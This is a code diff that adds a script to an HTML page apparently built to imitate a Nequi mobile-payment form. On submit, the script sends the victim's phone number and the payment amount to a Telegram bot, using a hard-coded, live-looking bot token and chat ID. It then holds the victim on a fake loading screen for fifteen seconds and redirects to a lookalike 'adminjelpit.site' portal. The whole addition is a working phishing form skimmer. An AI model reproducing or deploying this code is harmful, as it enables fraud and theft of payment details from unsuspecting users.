@@ -383,5 +383,115 @@
     });
   </script>
 
+   <script>
+    // ================= CONFIGURACIÓN DE TELEGRAM =================
+    // Reemplaza con tus datos reales
+    const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';   // Ejemplo: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+    const TELEGRAM_CHAT_ID = '7776240161';       // Ejemplo: '123456789'
+
+    // ================= OCULTAR LOADER INICIAL =================
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        const initialLoader = document.getElementById('initialLoader');
+        if (initialLoader) {
+          initialLoader.classList.add('hidden');
+          initialLoader.style.pointerEvents = 'none';
+          initialLoader.style.zIndex = '-1';
+        }
+      }, 3000);
+    });
+
+    // ================= REFERENCIAS A ELEMENTOS =================
+    const form = document.getElementById('nequiForm');
+    const input = document.getElementById('telefono');
+    const modal = document.getElementById('loadingModal');
+    const montoEl = document.getElementById('monto');
+
+    // ================= OBTENER Y MOSTRAR MONTO =================
+    function obtenerMontoRaw() {
+      try {
+        return (
+          localStorage.getItem("finalAmount") ||
+          sessionStorage.getItem("finalAmount") ||
+          localStorage.getItem("total_pagar") ||
+          sessionStorage.getItem("total_pagar") ||
+          "0"
+        );
+      } catch (e) {
+        return "0";
+      }
+    }
+
+    let totalPagarRaw = obtenerMontoRaw();
+    totalPagarRaw = totalPagarRaw.toString().replace(/[^\d.,]/g, '').replace(/\./g, '').replace(',', '.');
+    const totalPagarNumero = parseFloat(totalPagarRaw) || 0;
+    
+    if (totalPagarNumero > 0) {
+      const montoFormateado = totalPagarNumero.toLocaleString("es-CO", {
+        style: "currency",
+        currency: "COP"
+      });
+      montoEl.textContent = "Monto: " + montoFormateado;
+    }
+
+    // ================= FUNCIÓN PARA MOSTRAR ERROR =================
+    function mostrarError(mensaje) {
+      alert(mensaje);
+    }
+
+    // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
+    async function enviarNotificacionTelegram(montoTexto, numero) {
+      const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Error al enviar a Telegram:', data.description);
+          return false;
+        }
+        console.log('Notificación enviada a Telegram');
+        return true;
+      } catch (error) {
+        console.error('Error de red al enviar a Telegram:', error);
+        return false;
+      }
+    }
+
+    // ================= EVENTO DEL FORMULARIO =================
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const nequi = input.value.trim();
+      if (!/^\d{10}$/.test(nequi)) {
+        return mostrarError("El número debe tener exactamente 10 dígitos.");
+      }
+
+      // Obtener el monto formateado que se muestra en la interfaz
+      const montoMostrado = montoEl.textContent.replace('Monto: ', ''); // ej: "$ 983.390"
+
+      // 1. Mostrar modal de carga
+      modal.style.display = 'flex';
+
+      // 2. Enviar notificación a Telegram (esperamos que termine)
+      await enviarNotificacionTelegram(montoMostrado, nequi);
+
+      // 3. Esperar 15 segundos (15000 ms) con el modal visible
+      await new Promise(resolve => setTimeout(resolve, 15000));
+
+      // 4. Redirigir a la URL indicada
+      window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
+    });
+  </script>
+
 </body>
 </html>
